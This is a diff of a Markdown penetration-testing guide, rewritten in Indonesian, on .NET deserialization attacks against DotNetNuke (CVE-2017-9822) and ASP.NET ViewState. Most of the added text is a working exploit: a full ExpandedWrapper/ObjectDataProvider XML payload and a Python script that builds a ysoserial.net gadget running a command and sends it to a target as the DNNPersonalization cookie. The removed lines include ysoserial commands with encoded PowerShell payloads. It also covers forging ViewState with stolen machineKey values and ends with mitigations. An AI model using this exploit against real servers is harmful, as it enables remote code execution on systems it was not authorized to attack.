@@ -1,116 +1,117 @@
 ---
-name: ".NET Deserialization RCE"
-description: "Understanding .NET serializers (BinaryFormatter, LosFormatter, ObjectStateFormatter, etc.), ysoserial.net gadget chains, identifying deserialization sinks in source code, common patterns, and mitigation."
-tags: [oswe, dotnet, deserialization, rce, binaryformatter, losformatter, ysoserial]
+name: ".NET Deserialization — XmlSerializer, ExpandedWrapper, LosFormatter"
+description: "Eksploitasi deserialization .NET yang terverifikasi: root type dipilih dari input, XmlSerializer + ExpandedWrapper<T1,T2> + ObjectDataProvider, LosFormatter/ObjectStateFormatter sebagai inner payload, ViewState dan machineKey, batas .NET 5+, bukti, dan mitigasi."
+tags: [dotnet, deserialization, xmlserializer, expandedwrapper, objectdataprovider, losformatter, viewstate, ysoserial]
 ---
 
-## .NET Deserialization RCE
+# .NET Deserialization — XmlSerializer, ExpandedWrapper, LosFormatter
 
-### Understanding .NET Serialization
+Pola yang paling sering diajarkan untuk DotNetNuke (CVE-2017-9822) **bukan** "cookie 3DES dengan kunci hardcoded + LosFormatter". Pola yang terverifikasi dari generator ysoserial.net adalah:
 
-.NET memiliki beberapa serializer yang bisa disalahgunakan untuk RCE:
+> Sink memilih **root type dari input**, lalu `new XmlSerializer(Type.GetType(input)).Deserialize(...)`. Attacker memilih `System.Data.Services.Internal.ExpandedWrapper<T1,T2>`; wrapper memasukkan T1 ke scope tipe XmlSerializer, sehingga `xsi:type` boleh menunjuk T1 dan `ObjectDataProvider` dapat memanggil method pada instance T1. Cookie `DNNPersonalization` dikirim sebagai **XML polos**, tanpa enkripsi.
 
-| Serializer | Method | How it works | Risky? |
-|-----------|--------|-------------|--------|
-| `BinaryFormatter` | `Deserialize()` | Full object graph deserialization | **High** |
-| `LosFormatter` | `Deserialize()` | Used by ASP.NET ViewState / DNN | **High** |
-| `ObjectStateFormatter` | `Deserialize()` | Similar to LosFormatter | **High** |
-| `NetDataContractSerializer` | `Deserialize()` | Full type fidelity | **High** |
-| `SoapFormatter` | `Deserialize()` | SOAP-based, full type | **High** |
-| `XmlSerializer` | `Deserialize()` | XML-based, type-restricted | **Medium** |
-| `DataContractSerializer` | `ReadObject()` | XML-based, opt-in types | **Medium** |
-| `JavaScriptSerializer` | `Deserialize()` | JSON-based, limited | **Low** |
-| `Newtonsoft.Json` | `TypeNameHandling.Auto/All` | JSON with $type | **High** |
+Klaim kunci hardcoded `F8B2E5D9A7C34F1B` dan "dekripsi 3DES lalu LosFormatter" tidak punya sumber; jangan dipakai.
 
-### ysoserial.net Gadget Chains
+## 1. Serializer dan statusnya
 
-**Tool**: [ysoserial.net](https://github.com/pwntester/ysoserial.net)
+| Serializer | Object graph | Type info di payload | .NET 5+ | Catatan |
+|---|---|---|---|---|
+| BinaryFormatter | penuh | ya (type + assembly) | obsolete 5–8, **selalu throw di 9** | binder bukan mitigasi |
+| LosFormatter | penuh | ya | hanya .NET Framework | tanpa binder; ViewState/DNN |
+| ObjectStateFormatter | penuh | ya | hanya .NET Framework | ViewState |
+| NetDataContractSerializer | penuh | ya | tidak diporting **[UNVERIFIED]** | setara BinaryFormatter |
+| SoapFormatter | penuh | ya | hanya .NET Framework | setara |
+| XmlSerializer | terbatas tipe yang dideklarasikan | tidak, kecuali `xsi:type` untuk member `object`/known types | ada | aman hanya bila root type tetap |
+| DataContractSerializer | terbatas kontrak | `i:type` untuk known types | ada | butuh KnownTypes |
+| JavaScriptSerializer | JSON | `__type` bila resolver dipasang | hanya Framework | `SimpleTypeResolver` = RCE |
+| Newtonsoft.Json | JSON | `$type` (`TypeNameHandling`) | ada | default `None`; `Auto/All` = RCE |
 
-```powershell
-# TypeConfuseDelegate — most versatile
-ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "powershell -enc BASE64"
+## 2. Konstruksi payload
 
-# ObjectDataProvider
-ysoserial.exe -f LosFormatter -g ObjectDataProvider -c "powershell -enc BASE64"
+1. Pastikan sink memakai atribut `type` (atau parameter) untuk memilih root type. Tanpa itu, pola ini tidak berlaku.
+2. T1 = tipe yang diselundupkan ke scope (`System.Web.UI.ObjectStateFormatter` untuk rantai dua tahap). T2 = `System.Windows.Data.ObjectDataProvider`.
+3. Type string: `System.Data.Services.Internal.ExpandedWrapper\`2[[T1, asm...],[T2, asm...]], System.Data.Services, ...`.
+4. Nama elemen anak mengikuti konvensi XmlSerializer: `ExpandedWrapperOf<T1><T2>`.
+5. `<ExpandedElement/>` = instance T1 kosong; kehadirannya yang mendaftarkan T1 ke scope.
+6. `<ProjectedProperty0>` memuat `MethodName`, `MethodParameters`, dan `ObjectInstance xsi:type="T1"`.
+7. Inner payload: `ObjectStateFormatter.Deserialize(base64 ...)` — di sinilah LosFormatter/BinaryFormatter tetap relevan.
 
-# ActivitySurrogateSelector — for BinaryFormatter
-ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -c "powershell -enc BASE64"
-
-# FileSavePicker / FileDeletePicker — for file operations
-ysoserial.exe -f BinaryFormatter -g FileSavePicker -c "C:\path\to\write"
+```xml
+<profile><item key="k" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
+ <ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <ExpandedElement/>
+  <ProjectedProperty0>
+   <MethodName>Deserialize</MethodName>
+   <MethodParameters><anyType xsi:type="xsd:string">BASE64_INNER_GADGET</anyType></MethodParameters>
+   <ObjectInstance xsi:type="ObjectStateFormatter"/>
+  </ProjectedProperty0>
+ </ExpandedWrapperOfObjectStateFormatterObjectDataProvider>
+</item></profile>
 ```
 
-### Source Code Review Patterns
+Mengapa berhasil meski XmlSerializer tidak menyimpan type info: aplikasi memilih root type dari input; properti bertipe `object` menerima `xsi:type`; dan `ExpandedWrapper<T1,T2>` menambahkan T1 ke scope lewat properti `ExpandedElement`. Setter `ObjectInstance`/`MethodName` memicu `Refresh()` → `BeginQuery` → `InvokeMember(...)`.
 
-**Primary Sinks**:
-```csharp
-// BinaryFormatter — most dangerous
-BinaryFormatter formatter = new BinaryFormatter();
-object obj = formatter.Deserialize(stream);
-
-// LosFormatter — ASP.NET ViewState / DNN
-LosFormatter formatter = new LosFormatter();
-object obj = formatter.Deserialize(serializedData);
-
-// ObjectStateFormatter — similar to LosFormatter
-ObjectStateFormatter formatter = new ObjectStateFormatter();
-object obj = formatter.Deserialize(serializedData);
-
-// Newtonsoft.Json with TypeNameHandling
-JsonSerializerSettings settings = new JsonSerializerSettings {
-    TypeNameHandling = TypeNameHandling.Auto  // or All
-};
-object obj = JsonConvert.DeserializeObject(json, settings);
-```
-
-**DNN-specific Pattern (CVE-2017-9822)**:
-```csharp
-// Hardcoded encryption key + LosFormatter
-string key = "F8B2E5D9A7C34F1B";  // example hardcoded key
-byte[] keyBytes = Encoding.UTF8.GetBytes(key);
-// Decrypt cookie → deserialize with LosFormatter
-LosFormatter formatter = new LosFormatter();
-formatter.Deserialize(decryptedData);
-```
-
-### Exploit Flow
-
-1. **Identify sink**: Find `Deserialize()` call in source code
-2. **Determine serializer**: BinaryFormatter, LosFormatter, etc.
-3. **Check for encryption**: If data is encrypted before deserialization, find the key
-4. **Generate payload**: Use ysoserial.net with correct formatter and gadget
-5. **Send payload**: Encode/gadget chain and send to target
+## 3. Generator dan pengiriman
 
 ```python
-import requests
-import subprocess
-import base64
+import base64, subprocess, requests
 
-TARGET = "http://target"
-YSOSERIAL = "ysoserial.exe"
+inner = subprocess.check_output([
+    "ysoserial.exe", "-f", "LosFormatter", "-g", "TypeConfuseDelegate",
+    "-c", "cmd /c whoami > C:\\inetpub\\wwwroot\\p.txt"
+]).decode().strip()
 
-def gen_payload(formatter, gadget, command):
-    cmd = f"mono {YSOSERIAL} -f {formatter} -g {gadget} -c \"{command}\""
-    result = subprocess.check_output(cmd, shell=True)
-    return result.strip()
-
-payload = gen_payload("LosFormatter", "TypeConfuseDelegate", "powershell -enc BASE64")
-cookies = {"DNNPersonalization": payload}
-r = requests.get(TARGET, cookies=cookies)
+t1 = "System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
+t2 = "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
+xml = (
+    '<profile><item key="k" type="System.Data.Services.Internal.ExpandedWrapper`2'
+    f'[[{t1}],[{t2}]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">'
+    '<ExpandedWrapperOfObjectStateFormatterObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">'
+    '<ExpandedElement/><ProjectedProperty0><MethodName>Deserialize</MethodName>'
+    f'<MethodParameters><anyType xsi:type="xsd:string">{inner}</anyType></MethodParameters>'
+    '<ObjectInstance xsi:type="ObjectStateFormatter"/></ProjectedProperty0>'
+    '</ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>'
+)
+r = requests.get("http://target/", cookies={"DNNPersonalization": xml}, timeout=20)
+print(r.status_code, len(r.content))
 ```
 
-### Mitigation
+Prasyarat runtime: `System.Data.Services` (WCF Data Services) dan `PresentationFramework` (WPF) harus ada di host. Aplikasi .NET Core tanpa `Microsoft.WindowsDesktop.App` tidak punya `ObjectDataProvider` — gadget mati sebelum dikirim.
 
-```csharp
-// Replace BinaryFormatter with safer alternatives
-// Use JsonSerializer with TypeNameHandling.None
-JsonSerializerSettings settings = new JsonSerializerSettings {
-    TypeNameHandling = TypeNameHandling.None
-};
+## 4. ViewState dan machineKey
 
-// Use DataContractSerializer with explicit known types
-DataContractSerializer serializer = new DataContractSerializer(typeof(KnownType));
+ViewState memakai format `ObjectStateFormatter` dan dilindungi `machineKey` (AES/HMAC). Tanpa `validationKey`/`decryptionKey` — dari `web.config`, `machine.config`, atau `configSource` — ViewState tidak bisa diforge. `AutoGenerate`/`IsolateApps` membuat kunci per-mesin.
 
-// Implement custom SerializationBinder to restrict types
-formatter.Binder = new CustomBinder();
-```
+ysoserial.net menyediakan plugin ViewState (`--validationkey`, `--decryptionkey`, `--generator`). Bedakan error MAC (kunci salah) dari error deserialization (payload salah) — keduanya bukan bukti eksekusi.
+
+## 5. Bukti
+
+- Request/response mentah berisi payload + timestamp; status 200/500 bukan bukti.
+- Callback OOB dari perintah, atau berkas output dengan isi yang diharapkan.
+- Breakpoint dnSpy pada `XmlSerializer.Deserialize` / `ObjectStateFormatter.Deserialize` dengan argumen = payload kita, lalu stack ke sink.
+- Bukti negatif: error "type could not be resolved" atau "error generating XML document" berarti tipe/assembly tidak cocok, bukan berhasil.
+
+## 6. Jebakan
+
+- Ciphertext 3DES atau base64 panjang tidak otomatis BinaryFormatter: payload DNN CVE-2017-9822 justru XML polos; ViewState base64 adalah `ObjectStateFormatter`.
+- Kompresi: sebagian aplikasi meng-gzip payload (`GZipStream`/`DeflateStream`); dekompres sebelum membaca magic bytes.
+- Gadget bergantung versi: `TypeConfuseDelegate` butuh `SortedSet`/`ComparisonComparer` (.NET 4.x); `ActivitySurrogateSelector` diblokir proteksi tipe .NET 4.8+ (gunakan `ActivitySurrogateDisableTypeCheck`); `TextFormattingRunProperties` butuh WPF.
+- `SerializationBinder` saja tidak cukup: DoS tidak termitigasi binder, dan LosFormatter/ObjectStateFormatter/XmlSerializer tidak punya binder.
+- Jangan klaim RCE dari stack trace atau "payload terkirim".
+
+Mitigasi di akar masalah: jangan memilih tipe dari input (`Type.GetType` dari request), whitelist tipe tetap, migrasi ke `System.Text.Json`/`DataContractSerializer` dengan kontrak tetap, nonaktifkan `BinaryFormatter`, rotasi `machineKey`, `ViewStateEncryptionMode=Always`.
+
+## 7. Best Practices
+
+- Verifikasi apakah sink benar-benar memilih tipe dari input sebelum menyusun payload.
+- Cocokkan assembly host (WPF, Data Services) sebelum memilih gadget.
+- Uji dengan perintah non-destruktif; simpan bukti negatif saat tipe gagal resolve.
+- Bedakan forgery ViewState dari deserialization cookie; keduanya punya prasyarat berbeda.
+- Catat versi runtime .NET dan daftar assembly — gadget tanpa itu tidak bisa direproduksi.
+
+## 8. Rujukan
+
+- [source-recovery-debugging.md](./source-recovery-debugging.md) — menemukan sink dari DLL dan machineKey.
+- [java-web-exploitation.md](./java-web-exploitation.md) — padanan untuk Java (XXE, HSQLDB/H2).
+- ysoserial.net (`DotNetNukePlugin.cs`, `ObjectDataProviderGenerator.cs`, `ViewStatePlugin.cs`).
+- Microsoft: BinaryFormatter security guide; XmlSerializer/ObjectDataProvider API docs.
